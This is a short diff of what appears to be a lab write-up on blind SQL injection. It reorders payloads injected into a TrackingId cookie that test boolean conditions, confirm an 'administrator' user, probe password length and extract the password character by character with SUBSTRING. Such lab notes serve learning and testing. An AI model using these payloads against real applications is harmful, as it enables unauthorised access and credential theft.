@@ -118,10 +118,11 @@ TrackingId=xyz' AND '1'='1
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
 ```
 ```sh
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 ```
-
+```sh
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
 ```sh    
 TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
 ```
